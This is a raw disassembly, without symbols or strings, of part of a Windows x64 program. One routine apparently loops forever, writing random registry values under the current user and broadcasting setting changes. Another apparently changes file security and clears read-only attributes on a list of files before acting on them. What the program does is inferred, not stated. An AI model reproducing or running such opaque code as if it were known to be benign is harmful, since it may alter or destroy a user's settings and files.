   14000346d:	80 7d d4 00          	cmpb   $0x0,-0x2c(%rbp)
   140003471:	74 0a                	je     0x14000347d
   140003473:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003478:	e8 e3 2a 00 00       	call   0x140005f60
   14000347d:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003482:	ff 15 28 4d 00 00    	call   *0x4d28(%rip)        # 0x1400081b0
   140003488:	90                   	nop
   140003489:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000348e:	ff 15 fc 4c 00 00    	call   *0x4cfc(%rip)        # 0x140008190
   140003494:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   140003498:	ff 15 1a 4d 00 00    	call   *0x4d1a(%rip)        # 0x1400081b8
   14000349e:	90                   	nop
   14000349f:	48 2b f3             	sub    %rbx,%rsi
   1400034a2:	48 81 fe 00 10 00 00 	cmp    $0x1000,%rsi
   1400034a9:	72 1c                	jb     0x1400034c7
   1400034ab:	48 83 c6 27          	add    $0x27,%rsi
   1400034af:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   1400034b3:	48 2b d8             	sub    %rax,%rbx
   1400034b6:	48 83 eb 08          	sub    $0x8,%rbx
   1400034ba:	48 83 fb 1f          	cmp    $0x1f,%rbx
   1400034be:	0f 87 2a 01 00 00    	ja     0x1400035ee
   1400034c4:	48 8b d8             	mov    %rax,%rbx
   1400034c7:	48 8b d6             	mov    %rsi,%rdx
   1400034ca:	48 8b cb             	mov    %rbx,%rcx
   1400034cd:	e8 ce 34 00 00       	call   0x1400069a0
   1400034d2:	48 8b 8d 80 01 00 00 	mov    0x180(%rbp),%rcx
   1400034d9:	48 33 cc             	xor    %rsp,%rcx
   1400034dc:	e8 9f 34 00 00       	call   0x140006980
   1400034e1:	4c 8d 9c 24 90 02 00 	lea    0x290(%rsp),%r11
   1400034e8:	00 
   1400034e9:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1400034ed:	49 8b 73 28          	mov    0x28(%r11),%rsi
   1400034f1:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   1400034f5:	4d 8b 63 38          	mov    0x38(%r11),%r12
   1400034f9:	49 8b e3             	mov    %r11,%rsp
   1400034fc:	41 5f                	pop    %r15
   1400034fe:	41 5e                	pop    %r14
   140003500:	5d                   	pop    %rbp
   140003501:	c3                   	ret
   140003502:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003507:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000350b:	4c 89 7c 0c 50       	mov    %r15,0x50(%rsp,%rcx,1)
   140003510:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003515:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003519:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   14000351f:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   140003523:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   140003528:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
   14000352d:	74 28                	je     0x140003557
   14000352f:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   140003533:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140003538:	48 39 08             	cmp    %rcx,(%rax)
   14000353b:	75 1a                	jne    0x140003557
   14000353d:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140003541:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140003545:	48 89 08             	mov    %rcx,(%rax)
   140003548:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   14000354c:	48 89 08             	mov    %rcx,(%rax)
   14000354f:	2b d1                	sub    %ecx,%edx
   140003551:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
   140003555:	89 10                	mov    %edx,(%rax)
   140003557:	80 7d d4 00          	cmpb   $0x0,-0x2c(%rbp)
   14000355b:	74 0a                	je     0x140003567
   14000355d:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003562:	e8 f9 29 00 00       	call   0x140005f60
   140003567:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000356c:	ff 15 3e 4c 00 00    	call   *0x4c3e(%rip)        # 0x1400081b0
   140003572:	90                   	nop
   140003573:	e9 11 ff ff ff       	jmp    0x140003489
   140003578:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000357d:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003581:	4c 89 7c 0c 50       	mov    %r15,0x50(%rsp,%rcx,1)
   140003586:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000358b:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000358f:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140003595:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   140003599:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   14000359e:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
   1400035a3:	74 28                	je     0x1400035cd
   1400035a5:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   1400035a9:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400035ae:	48 39 08             	cmp    %rcx,(%rax)
   1400035b1:	75 1a                	jne    0x1400035cd
   1400035b3:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   1400035b7:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   1400035bb:	48 89 08             	mov    %rcx,(%rax)
   1400035be:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   1400035c2:	48 89 08             	mov    %rcx,(%rax)
   1400035c5:	2b d1                	sub    %ecx,%edx
   1400035c7:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
   1400035cb:	89 10                	mov    %edx,(%rax)
   1400035cd:	80 7d d4 00          	cmpb   $0x0,-0x2c(%rbp)
   1400035d1:	74 0a                	je     0x1400035dd
   1400035d3:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400035d8:	e8 83 29 00 00       	call   0x140005f60
   1400035dd:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400035e2:	ff 15 c8 4b 00 00    	call   *0x4bc8(%rip)        # 0x1400081b0
   1400035e8:	90                   	nop
   1400035e9:	e9 9b fe ff ff       	jmp    0x140003489
   1400035ee:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400035f5:	00 00 
   1400035f7:	45 33 c9             	xor    %r9d,%r9d
   1400035fa:	45 33 c0             	xor    %r8d,%r8d
   1400035fd:	33 d2                	xor    %edx,%edx
   1400035ff:	33 c9                	xor    %ecx,%ecx
   140003601:	ff 15 b9 4e 00 00    	call   *0x4eb9(%rip)        # 0x1400084c0
   140003607:	cc                   	int3
   140003608:	cc                   	int3
   140003609:	cc                   	int3
   14000360a:	cc                   	int3
   14000360b:	cc                   	int3
   14000360c:	cc                   	int3
   14000360d:	cc                   	int3
   14000360e:	cc                   	int3
   14000360f:	cc                   	int3
   140003610:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003615:	57                   	push   %rdi
   140003616:	48 83 ec 20          	sub    $0x20,%rsp
   14000361a:	48 8d b9 a8 00 00 00 	lea    0xa8(%rcx),%rdi
   140003621:	48 8b 01             	mov    (%rcx),%rax
   140003624:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140003628:	48 8d 05 c9 5a 00 00 	lea    0x5ac9(%rip),%rax        # 0x1400090f8
   14000362f:	48 89 84 3a 58 ff ff 	mov    %rax,-0xa8(%rdx,%rdi,1)
   140003636:	ff 
   140003637:	48 8b 01             	mov    (%rcx),%rax
   14000363a:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000363e:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140003644:	89 94 39 54 ff ff ff 	mov    %edx,-0xac(%rcx,%rdi,1)
   14000364b:	48 8d 9f 60 ff ff ff 	lea    -0xa0(%rdi),%rbx
   140003652:	48 8d 05 1f 5a 00 00 	lea    0x5a1f(%rip),%rax        # 0x140009078
   140003659:	48 89 03             	mov    %rax,(%rbx)
   14000365c:	48 83 bb 80 00 00 00 	cmpq   $0x0,0x80(%rbx)
   140003663:	00 
   140003664:	74 2f                	je     0x140003695
   140003666:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   14000366a:	48 8d 43 70          	lea    0x70(%rbx),%rax
   14000366e:	48 39 01             	cmp    %rax,(%rcx)
   140003671:	75 22                	jne    0x140003695
   140003673:	4c 8b 83 90 00 00 00 	mov    0x90(%rbx),%r8
   14000367a:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   140003681:	48 89 11             	mov    %rdx,(%rcx)
   140003684:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140003688:	48 89 10             	mov    %rdx,(%rax)
   14000368b:	44 2b c2             	sub    %edx,%r8d
   14000368e:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140003692:	44 89 00             	mov    %r8d,(%rax)
   140003695:	80 7b 7c 00          	cmpb   $0x0,0x7c(%rbx)
   140003699:	74 08                	je     0x1400036a3
   14000369b:	48 8b cb             	mov    %rbx,%rcx
   14000369e:	e8 bd 28 00 00       	call   0x140005f60
   1400036a3:	48 8b cb             	mov    %rbx,%rcx
   1400036a6:	ff 15 04 4b 00 00    	call   *0x4b04(%rip)        # 0x1400081b0
   1400036ac:	90                   	nop
   1400036ad:	48 8d 8f 68 ff ff ff 	lea    -0x98(%rdi),%rcx
   1400036b4:	ff 15 d6 4a 00 00    	call   *0x4ad6(%rip)        # 0x140008190
   1400036ba:	48 8b cf             	mov    %rdi,%rcx
   1400036bd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400036c2:	48 83 c4 20          	add    $0x20,%rsp
   1400036c6:	5f                   	pop    %rdi
   1400036c7:	48 ff 25 ea 4a 00 00 	rex.W jmp *0x4aea(%rip)        # 0x1400081b8
   1400036ce:	cc                   	int3
   1400036cf:	cc                   	int3
   1400036d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400036d5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400036da:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400036df:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400036e4:	41 56                	push   %r14
   1400036e6:	b8 20 14 00 00       	mov    $0x1420,%eax
   1400036eb:	e8 b0 38 00 00       	call   0x140006fa0
   1400036f0:	48 2b e0             	sub    %rax,%rsp
   1400036f3:	48 8b 05 46 99 00 00 	mov    0x9946(%rip),%rax        # 0x14000d040
   1400036fa:	48 33 c4             	xor    %rsp,%rax
   1400036fd:	48 89 84 24 10 14 00 	mov    %rax,0x1410(%rsp)
   140003704:	00 
   140003705:	66 0f 6f 05 23 5a 00 	movdqa 0x5a23(%rip),%xmm0        # 0x140009130
   14000370c:	00 
   14000370d:	f3 0f 7f 44 24 50    	movdqu %xmm0,0x50(%rsp)
   140003713:	c7 44 24 60 c0 00 00 	movl   $0xc0,0x60(%rsp)
   14000371a:	00 
   14000371b:	ff 15 f7 4a 00 00    	call   *0x4af7(%rip)        # 0x140008218
   140003721:	c7 84 24 04 14 00 00 	movl   $0xffffffff,0x1404(%rsp)
   140003728:	ff ff ff ff 
   14000372c:	ba 01 00 00 00       	mov    $0x1,%edx
   140003731:	89 84 24 84 00 00 00 	mov    %eax,0x84(%rsp)
   140003738:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000373f:	00 
   140003740:	8b c8                	mov    %eax,%ecx
   140003742:	c1 e9 1e             	shr    $0x1e,%ecx
   140003745:	33 c8                	xor    %eax,%ecx
   140003747:	69 c1 65 89 07 6c    	imul   $0x6c078965,%ecx,%eax
   14000374d:	03 c2                	add    %edx,%eax
   14000374f:	89 84 94 84 00 00 00 	mov    %eax,0x84(%rsp,%rdx,4)
   140003756:	48 ff c2             	inc    %rdx
   140003759:	48 81 fa 70 02 00 00 	cmp    $0x270,%rdx
   140003760:	72 de                	jb     0x140003740
   140003762:	c7 84 24 80 00 00 00 	movl   $0x270,0x80(%rsp)
   140003769:	70 02 00 00 
   14000376d:	33 ed                	xor    %ebp,%ebp
   14000376f:	41 be 00 00 00 80    	mov    $0x80000000,%r14d
   140003775:	48 bf ff a1 2f 4d ff 	movabs $0x7fffffff4d2fa1ff,%rdi
   14000377c:	ff ff 7f 
   14000377f:	be 00 5e d0 b2       	mov    $0xb2d05e00,%esi
   140003784:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   14000378b:	ff ff 7f 
   14000378e:	66 90                	xchg   %ax,%ax
   140003790:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   140003797:	00 
   140003798:	e8 53 2e 00 00       	call   0x1400065f0
   14000379d:	8b c8                	mov    %eax,%ecx
   14000379f:	48 8d 04 89          	lea    (%rcx,%rcx,4),%rax
   1400037a3:	85 c0                	test   %eax,%eax
   1400037a5:	75 21                	jne    0x1400037c8
   1400037a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400037ae:	00 00 
   1400037b0:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   1400037b7:	00 
   1400037b8:	e8 33 2e 00 00       	call   0x1400065f0
   1400037bd:	8b c8                	mov    %eax,%ecx
   1400037bf:	48 8d 04 89          	lea    (%rcx,%rcx,4),%rax
   1400037c3:	83 f8 01             	cmp    $0x1,%eax
   1400037c6:	72 e8                	jb     0x1400037b0
   1400037c8:	48 c1 e8 20          	shr    $0x20,%rax
   1400037cc:	48 8d 15 cd 54 00 00 	lea    0x54cd(%rip),%rdx        # 0x140008ca0
   1400037d3:	49 2b c6             	sub    %r14,%rax
   1400037d6:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   1400037dc:	48 35 00 00 00 80    	xor    $0xffffffff80000000,%rax
   1400037e2:	45 33 c0             	xor    %r8d,%r8d
   1400037e5:	8b 4c 84 50          	mov    0x50(%rsp,%rax,4),%ecx
   1400037e9:	48 8d 44 24 68       	lea    0x68(%rsp),%rax
   1400037ee:	89 4c 24 70          	mov    %ecx,0x70(%rsp)
   1400037f2:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
   1400037f9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400037fe:	ff 15 04 48 00 00    	call   *0x4804(%rip)        # 0x140008008
   140003804:	85 c0                	test   %eax,%eax
   140003806:	75 67                	jne    0x14000386f
   140003808:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   14000380d:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   140003812:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140003819:	00 
   14000381a:	48 8d 15 af 54 00 00 	lea    0x54af(%rip),%rdx        # 0x140008cd0
   140003821:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140003827:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000382c:	45 33 c0             	xor    %r8d,%r8d
   14000382f:	ff 15 e3 47 00 00    	call   *0x47e3(%rip)        # 0x140008018
   140003835:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   14000383a:	ff 15 00 48 00 00    	call   *0x4800(%rip)        # 0x140008040
   140003840:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140003845:	4c 8d 0d 9c 54 00 00 	lea    0x549c(%rip),%r9        # 0x140008ce8
   14000384c:	c7 44 24 28 64 00 00 	movl   $0x64,0x28(%rsp)
   140003853:	00 
   140003854:	45 33 c0             	xor    %r8d,%r8d
   140003857:	ba 1a 00 00 00       	mov    $0x1a,%edx
   14000385c:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140003863:	00 
   140003864:	b9 ff ff 00 00       	mov    $0xffff,%ecx
   140003869:	ff 15 21 4b 00 00    	call   *0x4b21(%rip)        # 0x140008390
   14000386f:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140003874:	e8 a7 d7 ff ff       	call   0x140001020
   140003879:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000387e:	48 3b c7             	cmp    %rdi,%rax
   140003881:	7d 18                	jge    0x14000389b
   140003883:	48 8d 0c 30          	lea    (%rax,%rsi,1),%rcx
   140003887:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   14000388c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003891:	e8 ba 22 00 00       	call   0x140005b50
   140003896:	e9 f5 fe ff ff       	jmp    0x140003790
   14000389b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400038a0:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400038a5:	e8 a6 22 00 00       	call   0x140005b50
   1400038aa:	e9 e1 fe ff ff       	jmp    0x140003790
   1400038af:	cc                   	int3
   1400038b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400038b5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400038ba:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400038bf:	55                   	push   %rbp
   1400038c0:	48 8d ac 24 40 fe ff 	lea    -0x1c0(%rsp),%rbp
   1400038c7:	ff 
   1400038c8:	48 81 ec c0 02 00 00 	sub    $0x2c0,%rsp
   1400038cf:	48 8b 05 6a 97 00 00 	mov    0x976a(%rip),%rax        # 0x14000d040
   1400038d6:	48 33 c4             	xor    %rsp,%rax
   1400038d9:	48 89 85 b0 01 00 00 	mov    %rax,0x1b0(%rbp)
   1400038e0:	48 8d 15 d1 54 00 00 	lea    0x54d1(%rip),%rdx        # 0x140008db8
   1400038e7:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   1400038ee:	e8 ed 0f 00 00       	call   0x1400048e0
   1400038f3:	90                   	nop
   1400038f4:	33 f6                	xor    %esi,%esi
   1400038f6:	48 89 75 20          	mov    %rsi,0x20(%rbp)
   1400038fa:	ff 15 60 48 00 00    	call   *0x4860(%rip)        # 0x140008160
   140003900:	48 8b c8             	mov    %rax,%rcx
   140003903:	4c 8d 45 20          	lea    0x20(%rbp),%r8
   140003907:	ba 08 00 00 00       	mov    $0x8,%edx
   14000390c:	ff 15 ee 46 00 00    	call   *0x46ee(%rip)        # 0x140008000
   140003912:	85 c0                	test   %eax,%eax
   140003914:	0f 84 00 03 00 00    	je     0x140003c1a
   14000391a:	c7 85 88 00 00 00 00 	movl   $0x100,0x88(%rbp)
   140003921:	01 00 00 
   140003924:	48 8d 85 88 00 00 00 	lea    0x88(%rbp),%rax
   14000392b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003930:	41 b9 00 01 00 00    	mov    $0x100,%r9d
   140003936:	4c 8d 85 b0 00 00 00 	lea    0xb0(%rbp),%r8
   14000393d:	ba 01 00 00 00       	mov    $0x1,%edx
   140003942:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   140003946:	ff 15 c4 46 00 00    	call   *0x46c4(%rip)        # 0x140008010
   14000394c:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   140003950:	85 c0                	test   %eax,%eax
   140003952:	75 0b                	jne    0x14000395f
   140003954:	ff 15 76 47 00 00    	call   *0x4776(%rip)        # 0x1400080d0
   14000395a:	e9 bb 02 00 00       	jmp    0x140003c1a
   14000395f:	ff 15 6b 47 00 00    	call   *0x476b(%rip)        # 0x1400080d0
   140003965:	48 8b 9d b0 00 00 00 	mov    0xb0(%rbp),%rbx
   14000396c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000396f:	f3 0f 7f 45 4c       	movdqu %xmm0,0x4c(%rbp)
   140003974:	48 89 75 60          	mov    %rsi,0x60(%rbp)
   140003978:	c7 45 40 00 00 00 10 	movl   $0x10000000,0x40(%rbp)
   14000397f:	c7 45 44 02 00 00 00 	movl   $0x2,0x44(%rbp)
   140003986:	c7 45 48 03 00 00 00 	movl   $0x3,0x48(%rbp)
   14000398d:	89 75 5c             	mov    %esi,0x5c(%rbp)
   140003990:	48 89 5d 68          	mov    %rbx,0x68(%rbp)
   140003994:	48 89 75 38          	mov    %rsi,0x38(%rbp)
   140003998:	48 89 75 28          	mov    %rsi,0x28(%rbp)
   14000399c:	48 89 75 30          	mov    %rsi,0x30(%rbp)
   1400039a0:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   1400039a7:	48 83 bd a8 00 00 00 	cmpq   $0x7,0xa8(%rbp)
   1400039ae:	07 
   1400039af:	48 0f 47 8d 90 00 00 	cmova  0x90(%rbp),%rcx
   1400039b6:	00 
   1400039b7:	48 8d 45 30          	lea    0x30(%rbp),%rax
   1400039bb:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400039c0:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   1400039c5:	48 8d 45 38          	lea    0x38(%rbp),%rax
   1400039c9:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400039ce:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400039d3:	45 33 c9             	xor    %r9d,%r9d
   1400039d6:	ba 01 00 00 00       	mov    $0x1,%edx
   1400039db:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400039e1:	ff 15 39 46 00 00    	call   *0x4639(%rip)        # 0x140008020
   1400039e7:	85 c0                	test   %eax,%eax
   1400039e9:	0f 85 2b 02 00 00    	jne    0x140003c1a
   1400039ef:	4c 8d 4d 28          	lea    0x28(%rbp),%r9
   1400039f3:	4c 8b 45 38          	mov    0x38(%rbp),%r8
   1400039f7:	48 8d 55 40          	lea    0x40(%rbp),%rdx
   1400039fb:	b9 01 00 00 00       	mov    $0x1,%ecx
   140003a00:	ff 15 32 46 00 00    	call   *0x4632(%rip)        # 0x140008038
   140003a06:	85 c0                	test   %eax,%eax
   140003a08:	74 18                	je     0x140003a22
   140003a0a:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   140003a0e:	48 85 c9             	test   %rcx,%rcx
   140003a11:	0f 84 03 02 00 00    	je     0x140003c1a
   140003a17:	ff 15 cb 46 00 00    	call   *0x46cb(%rip)        # 0x1400080e8
   140003a1d:	e9 f8 01 00 00       	jmp    0x140003c1a
   140003a22:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   140003a29:	48 83 bd a8 00 00 00 	cmpq   $0x7,0xa8(%rbp)
   140003a30:	07 
   140003a31:	48 0f 47 8d 90 00 00 	cmova  0x90(%rbp),%rcx
   140003a38:	00 
   140003a39:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140003a3e:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140003a42:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003a47:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003a4c:	45 33 c9             	xor    %r9d,%r9d
   140003a4f:	ba 01 00 00 00       	mov    $0x1,%edx
   140003a54:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140003a5a:	ff 15 c8 45 00 00    	call   *0x45c8(%rip)        # 0x140008028
   140003a60:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   140003a64:	48 85 c9             	test   %rcx,%rcx
   140003a67:	74 06                	je     0x140003a6f
   140003a69:	ff 15 79 46 00 00    	call   *0x4679(%rip)        # 0x1400080e8
   140003a6f:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   140003a73:	48 85 c9             	test   %rcx,%rcx
   140003a76:	74 06                	je     0x140003a7e
   140003a78:	ff 15 6a 46 00 00    	call   *0x466a(%rip)        # 0x1400080e8
   140003a7e:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   140003a85:	48 83 bd a8 00 00 00 	cmpq   $0x7,0xa8(%rbp)
   140003a8c:	07 
   140003a8d:	48 0f 47 8d 90 00 00 	cmova  0x90(%rbp),%rcx
   140003a94:	00 
   140003a95:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140003a9a:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140003a9f:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003aa4:	4c 8b cb             	mov    %rbx,%r9
   140003aa7:	ba 01 00 00 00       	mov    $0x1,%edx
   140003aac:	44 8b c2             	mov    %edx,%r8d
   140003aaf:	ff 15 73 45 00 00    	call   *0x4573(%rip)        # 0x140008028
   140003ab5:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003ab8:	33 c0                	xor    %eax,%eax
   140003aba:	0f 11 45 70          	movups %xmm0,0x70(%rbp)
   140003abe:	48 89 85 80 00 00 00 	mov    %rax,0x80(%rbp)
   140003ac5:	48 8d 15 14 53 00 00 	lea    0x5314(%rip),%rdx        # 0x140008de0
   140003acc:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003ad1:	e8 0a 0e 00 00       	call   0x1400048e0
   140003ad6:	90                   	nop
   140003ad7:	48 8d 15 42 53 00 00 	lea    0x5342(%rip),%rdx        # 0x140008e20
   140003ade:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003ae3:	e8 f8 0d 00 00       	call   0x1400048e0
   140003ae8:	90                   	nop
   140003ae9:	48 8d 15 70 53 00 00 	lea    0x5370(%rip),%rdx        # 0x140008e60
   140003af0:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   140003af4:	e8 e7 0d 00 00       	call   0x1400048e0
   140003af9:	90                   	nop
   140003afa:	48 8d 15 af 53 00 00 	lea    0x53af(%rip),%rdx        # 0x140008eb0
   140003b01:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   140003b05:	e8 d6 0d 00 00       	call   0x1400048e0
   140003b0a:	90                   	nop
   140003b0b:	48 8d 15 ee 53 00 00 	lea    0x53ee(%rip),%rdx        # 0x140008f00
   140003b12:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140003b16:	e8 c5 0d 00 00       	call   0x1400048e0
   140003b1b:	90                   	nop
   140003b1c:	48 8d 15 2d 54 00 00 	lea    0x542d(%rip),%rdx        # 0x140008f50
   140003b23:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140003b27:	e8 b4 0d 00 00       	call   0x1400048e0
   140003b2c:	90                   	nop
   140003b2d:	48 8d 15 5c 54 00 00 	lea    0x545c(%rip),%rdx        # 0x140008f90
   140003b34:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140003b38:	e8 a3 0d 00 00       	call   0x1400048e0
   140003b3d:	90                   	nop
   140003b3e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003b41:	f3 0f 7f 45 70       	movdqu %xmm0,0x70(%rbp)
   140003b46:	48 89 b5 80 00 00 00 	mov    %rsi,0x80(%rbp)
   140003b4d:	b9 e0 00 00 00       	mov    $0xe0,%ecx
   140003b52:	e8 51 2e 00 00       	call   0x1400069a8
   140003b57:	48 89 45 70          	mov    %rax,0x70(%rbp)
   140003b5b:	48 89 45 78          	mov    %rax,0x78(%rbp)
   140003b5f:	48 8d 88 e0 00 00 00 	lea    0xe0(%rax),%rcx
   140003b66:	48 89 8d 80 00 00 00 	mov    %rcx,0x80(%rbp)
   140003b6d:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140003b71:	48 89 4d 38          	mov    %rcx,0x38(%rbp)
   140003b75:	4c 8d 4d 70          	lea    0x70(%rbp),%r9
   140003b79:	4c 8b c0             	mov    %rax,%r8
   140003b7c:	48 8d 55 20          	lea    0x20(%rbp),%rdx
   140003b80:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003b85:	e8 c6 24 00 00       	call   0x140006050
   140003b8a:	48 89 45 78          	mov    %rax,0x78(%rbp)
   140003b8e:	4c 8d 0d cb 0c 00 00 	lea    0xccb(%rip),%r9        # 0x140004860
   140003b95:	ba 20 00 00 00       	mov    $0x20,%edx
   140003b9a:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   140003ba0:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003ba5:	e8 3a 2e 00 00       	call   0x1400069e4
   140003baa:	48 8b 5d 70          	mov    0x70(%rbp),%rbx
   140003bae:	48 8b 7d 78          	mov    0x78(%rbp),%rdi
   140003bb2:	48 3b df             	cmp    %rdi,%rbx
   140003bb5:	74 59                	je     0x140003c10
   140003bb7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140003bbe:	00 00 
   140003bc0:	48 8b cb             	mov    %rbx,%rcx
   140003bc3:	48 83 7b 18 07       	cmpq   $0x7,0x18(%rbx)
   140003bc8:	76 03                	jbe    0x140003bcd
   140003bca:	48 8b 0b             	mov    (%rbx),%rcx
   140003bcd:	ff 15 75 45 00 00    	call   *0x4575(%rip)        # 0x140008148
   140003bd3:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003bd6:	74 1c                	je     0x140003bf4
   140003bd8:	a8 01                	test   $0x1,%al
   140003bda:	74 18                	je     0x140003bf4
   140003bdc:	48 8b cb             	mov    %rbx,%rcx
   140003bdf:	48 83 7b 18 07       	cmpq   $0x7,0x18(%rbx)
   140003be4:	76 03                	jbe    0x140003be9
   140003be6:	48 8b 0b             	mov    (%rbx),%rcx
   140003be9:	83 e0 fe             	and    $0xfffffffe,%eax
   140003bec:	8b d0                	mov    %eax,%edx
   140003bee:	ff 15 34 45 00 00    	call   *0x4534(%rip)        # 0x140008128
   140003bf4:	48 8b cb             	mov    %rbx,%rcx
   140003bf7:	48 83 7b 18 07       	cmpq   $0x7,0x18(%rbx)
   140003bfc:	76 03                	jbe    0x140003c01
   140003bfe:	48 8b 0b             	mov    (%rbx),%rcx
   140003c01:	ff 15 09 45 00 00    	call   *0x4509(%rip)        # 0x140008110
   140003c07:	48 83 c3 20          	add    $0x20,%rbx
   140003c0b:	48 3b df             	cmp    %rdi,%rbx
   140003c0e:	75 b0                	jne    0x140003bc0
